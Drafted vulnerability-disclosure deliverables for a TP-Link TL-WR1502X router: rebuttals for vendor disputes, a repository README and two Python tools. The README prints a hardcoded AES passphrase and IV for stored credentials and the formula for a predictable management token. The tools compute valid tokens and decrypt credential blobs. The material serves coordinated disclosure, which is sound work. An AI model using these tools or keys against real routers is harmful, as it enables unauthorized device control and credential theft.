# Deliverable 2 — Rebuttal template for vendor disputes

Use these in order of likelihood. Each addresses a specific pushback.

---

**If TP-Link says: "This is LAN-only, not remote."**

> LAN-adjacent is not the same as "not a vulnerability." TDP is the primary management protocol for the Tether app. Any device on the same broadcast domain — including guest-network clients if guest isolation is not enforced, IoT devices, or an attacker with a foothold on any LAN host — can send the discovery request, receive `DEV_ID`, compute the token, and issue authenticated management requests. The 2024 CVSS specification treats AV:A as a legitimate attack vector with meaningful severity (see CVE-2023-1389 and similar router vulnerabilities rated 8.x with AV:A). The relevant question is not "does the attacker need to be on the LAN," it is "does the attacker need any credential." They do not.

---

**If TP-Link says: "The token only authorizes read operations, not write."**

> The TDP opcode table (extracted from `usr/lib/lua/luci/controller/admin/tmp_server.lua`) includes explicit write operations routed through the same authentication path: `tmp_insert_vpn_server_account`, `tmp_delete_vpn_server_account`, `tmp_modify_vpn_server_account`, `tmp_set_website`, `tmp_block_website`, `tmp_set_filter`, `tmp_set_clients_list`, `tmp_del_clients_list`, `tmp_timing_reboot`, `tmp_sync_time`. If the token gates these opcodes, write access is included. If it does not gate them, then the authentication layer is even weaker than described. Either way, the finding stands.

---

**If TP-Link says: "DEV_ID is not secret, but the token is still cryptographically sound."**

> A "token" derived from a value that the device itself publishes to unauthenticated peers is not authentication. It is a checksum. Cryptographic strength is not the issue — the issue is the input. Any secret with zero entropy beyond a public identifier provides zero protection. The existence of the `tss_key` partition (6 bytes, factory-programmed, marked as extra data) demonstrates that the platform already has a per-device secret available and the affected code path simply does not use it.

---

**If TP-Link says: "The Tether app is the only expected client, and it uses additional protections."**

> Two responses. First, security must not depend on clients voluntarily implementing protections not enforced by the server; the TDP daemon accepts any TCP/UDP peer that presents the correct token, regardless of client. Second, if the Tether app layers additional protections (TLS to the cloud, a signed session, etc.), those apply only to the cloud path — the local TDP path is UDP plaintext, as confirmed by live capture on the LAN. The token is the only local authentication material, and it is predictable.

---

**If TP-Link says: "This is by design; DEV_ID is intended to be a public identifier."**

> If DEV_ID is intended to be public, then using it as cryptographic material is the design flaw. The problem is not that DEV_ID is disclosed — it is that DEV_ID is used as a secret. The two roles are mutually exclusive. Either DEV_ID should not be public (contradicting the discovery protocol) or the token derivation should use a different, non-public input. The `tss_key` partition exists precisely for this purpose.

---

**If TP-Link says: "We will consider it for a future firmware release" and closes the report.**

> Understood. Two requests before closure. First, please confirm in writing the affected firmware versions and whether the fix will ship as a security update (which implies a CVE and a public advisory). Second, if the fix is deferred beyond 90 days, I intend to publish the technical writeup after coordinating a disclosure date. Please advise on your preferred timeline so we can align.

---

**If TP-Link says: "The report does not include a working end-to-end exploit."**

> The report includes: (a) the disassembled token derivation from the vendor's own binary, (b) the response builder that places both DEV_ID and the derived token in the same outbound message, (c) the partition table showing the unused per-device secret partition, and (d) a live LAN capture showing unauthenticated TDP discovery broadcasts on UDP 20002. Reproducing the response capture requires either shell access on the router or monitor-mode Wi-Fi — both of which I can supply if you provide a test unit or confirm the response format matches the disassembly. In the absence of a test unit, the code path is unambiguous; this is not a heuristic.

---

# Deliverable 3 — GitHub README

```markdown
# tplink-wr1502x-analysis

Firmware analysis tooling and findings for the **TP-Link TL-WR1502X v1.0** (AX1500-class Wi-Fi 6 router).

Two security findings are documented in this repository:

1. **Predictable TDP/Tether authentication** — the token used by the Tether app is
   `MD5("TETHER_KEY_V1_" + DEV_ID)`, where `DEV_ID` is disclosed by the router to any
   LAN client in its own discovery response.
2. **Static AES-256 key and IV for stored credentials** — every unit of this model
   encrypts stored credentials (admin password, cloud password, VPN credentials)
   under the same key and IV, both baked into the released firmware image.

## Affected versions

| Model | Firmware |
|---|---|
| TL-WR1502X v1.0 | 1.2.11 Build 20251009 rel.56489(4555) |

Other firmware versions may be affected. Users are advised to check for updates.

## Repository contents

```
.
├── README.md
├── findings/
│   ├── 01-tdp-auth.md            # TDP/Tether predictable token
│   └── 02-static-aes.md          # Static AES key for credential storage
├── tools/
│   ├── decrypt_tplink_cloud.py   # Verify RSA signature of a Cloud-format image
│   ├── patch_lua_bytecode.py     # Patch the vendor's Lua 5.1 header flag byte
│   ├── decrypt_credential.py     # Decrypt a base64-encoded credential blob
│   └── verify_tether_token.py    # Compute TETHER_KEY_V1_<DEV_ID> for a given ID
├── captures/
│   └── tdp-discovery.pcap        # Example unauthenticated LAN discovery traffic
└── evidence/
    ├── tdpServer-disassembly.txt # Annotated objdump output
    └── crypto-constants.txt      # Constants extracted from luci.model.crypto
```

## Findings summary

### Finding 1 — Predictable Tether TDP authentication

`/usr/bin/tdpServer` computes the TDP authentication token as:

```
token = MD5( "TETHER_KEY_V1_" + DEV_ID )
```

`DEV_ID` is a 6-byte factory identifier stored in the `device-id` NVRAM partition.
The router includes this value in its own TDP discovery response (field 9), in the
same message that carries the authentication token (field 16). A per-device secret
partition (`tss_key`, partition 26) exists on the device but is not used.

**Impact:** Any LAN-adjacent attacker who can send a TDP discovery request (or observe
one) receives `DEV_ID` and can compute the corresponding token. The token is a
reusable bearer credential with no session binding or expiry.

### Finding 2 — Static AES key for credential storage

`/usr/lib/lua/luci/model/crypto.lua` (compiled bytecode) invokes the on-device
`openssl` binary to encrypt stored credentials with:

| Parameter | Value |
|---|---|
| Cipher | `aes-256-cbc` |
| KDF | `EVP_BytesToKey` with MD5 (`-md md5`, `-nosalt`) |
| Passphrase | `2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836` |
| IV | `360028C9064242F81074F4C127D299F6` |
| Pre-processing | zlib compress |
| Encoding | base64 |

**Impact:** Any config backup, flash dump, or extracted rootfs from any unit of this
model can be used to decrypt the credentials of any other unit.

## Quick reproduction

### Verify a Tether token from a known DEV_ID

```bash
python3 tools/verify_tether_token.py --dev-id 0123456789ab
```

### Decrypt a stored credential blob

```bash
python3 tools/decrypt_credential.py --input ciphertext.b64
# → prints the plaintext credential
```

### Patch vendor Lua bytecode for analysis

```bash
python3 tools/patch_lua_bytecode.py --input crypto.lua --output crypto.fixed.lua
# Then load crypto.fixed.lua with any Lua 5.1 decompiler
```

## Technical details

Detailed write-ups:

- [Finding 1 — TDP/Tether authentication](findings/01-tdp-auth.md)
- [Finding 2 — Static AES key](findings/02-static-aes.md)

A longer narrative writeup is published at: *(link to blog post, once disclosed)*

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-10-06 | Firmware analysis completed |
| (TBD) | Vendor notified (security@tp-link.com) |
| (TBD) | Vendor acknowledgment |
| (TBD) | Coordinated public disclosure (90 days after ack) |

## Suggested mitigations

For end users:

- Restrict LAN access to trusted devices; guest-network isolation helps but is not a
  complete mitigation because TDP broadcasts are not filtered by most deployments.
- Rotate Wi-Fi, admin, and cloud passwords periodically.
- Avoid exporting configuration backups to untrusted storage.

For TP-Link:

1. **TDP token:** derive authentication material from a per-device secret that is never
   transmitted. The `tss_key` partition already provides this. Prefer a nonce-based
   challenge-response over a static token.
2. **Credential storage:** generate a per-device AES key at first boot and store it in a
   protected NVRAM slot. Do not ship the key in the firmware image.
3. Remove the constant fallback token `MD5("TETHER_KEY_V1_")`.
4. Treat identifiers used as cryptographic inputs (DEV_ID, SPECIAL_ID) as
   confidentiality-sensitive until they are removed from the trust path.

## Credits

- Firmware analysis: *(your name/handle)*
- Tooling built on: [`tplink_decrypt`](https://github.com/sidhantgoel/tplink_decrypt),
  [`luadec51`](https://github.com/sztupy/luadec51)
- SDK source provided by TP-Link under GPL at: *(TP-Link GPL download page)*

## License

This repository is provided for defensive research and coordinated disclosure. Tooling
is released under the MIT License. Findings are published under CC BY 4.0 unless
otherwise noted.

## Contact

- Security issues in this repository: open an issue or use the email in the commit
  signature.
- Issues with the router itself: contact `security@tp-link.com`.
```

---

# Deliverable 4 — Minimal working reproduction tools

If you're going to publish the repo, these two small scripts are worth including. They fit the README and make the findings reproducible without any disassembly experience.

## `tools/verify_tether_token.py`

```python
#!/usr/bin/env python3
"""
Compute the Tether TDP authentication token for a given DEV_ID.

Usage:
    python3 verify_tether_token.py --dev-id 0123456789ab
    python3 verify_tether_token.py --empty        # the fallback token

The token is MD5("TETHER_KEY_V1_" + DEV_ID), where DEV_ID is the ASCII
string returned by `/sbin/getfirm DEV_ID` on the router.
"""
import argparse
import hashlib


def token_for(dev_id: str) -> str:
    material = f"TETHER_KEY_V1_{dev_id}".encode()
    return hashlib.md5(material).hexdigest()


def main():
    p = argparse.ArgumentParser()
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--dev-id", help="DEV_ID as printed by getfirm (hex or ascii)")
    g.add_argument("--empty", action="store_true",
                   help="compute the fallback token used when DEV_ID is unavailable")
    args = p.parse_args()

    dev_id = "" if args.empty else args.dev_id
    print(token_for(dev_id))


if __name__ == "__main__":
    main()
```

## `tools/decrypt_credential.py`

```python
#!/usr/bin/env python3
"""
Decrypt a base64-encoded credential blob produced by the TL-WR1502X
luci.model.crypto module.

Usage:
    python3 decrypt_credential.py --input blob.b64
    echo "sqZd9DX..." | python3 decrypt_credential.py --stdin

Requires: pycryptodome or cryptography for AES, plus zlib (stdlib).
"""
import argparse
import base64
import sys
import zlib

try:
    from Crypto.Cipher import AES
    from Crypto.Hash import MD5
    import Crypto.Util.Padding as padding
except ImportError:
    sys.stderr.write("pip install pycryptodome\n")
    sys.exit(1)


PASSPHRASE = b"2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836"
IV = bytes.fromhex("360028C9064242F81074F4C127D299F6")


def evp_bytes_to_key(passphrase: bytes, key_len: int, iv_len: int):
    """OpenSSL's legacy EVP_BytesToKey with MD5 and no salt."""
    d = b""
    prev = b""
    while len(d) < key_len + iv_len:
        h = MD5.new()
        h.update(prev + passphrase)
        prev = h.digest()
        d += prev
    return d[:key_len], d[key_len:key_len + iv_len]


def decrypt(b64_blob: str) -> bytes:
    ct = base64.b64decode(b64_blob.strip())
    key, _ = evp_bytes_to_key(PASSPHRASE, 32, 16)
    cipher = AES.new(key, AES.MODE_CBC, IV)
    padded = cipher.decrypt(ct)
    plaintext = padding.unpad(padded, AES.block_size)
    return zlib.decompress(plaintext)


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--input", help="path to a file containing the base64 blob")
    p.add_argument("--stdin", action="store_true", help="read blob from stdin")
    args = p.parse_args()

    if args.stdin:
        blob = sys.stdin.read()
    elif args.input:
        with open(args.input) as f:
            blob = f.read()
    else:
        p.error("provide --input or --stdin")

    print(decrypt(blob).decode(errors="replace"))


if __name__ == "__main__":
    main()
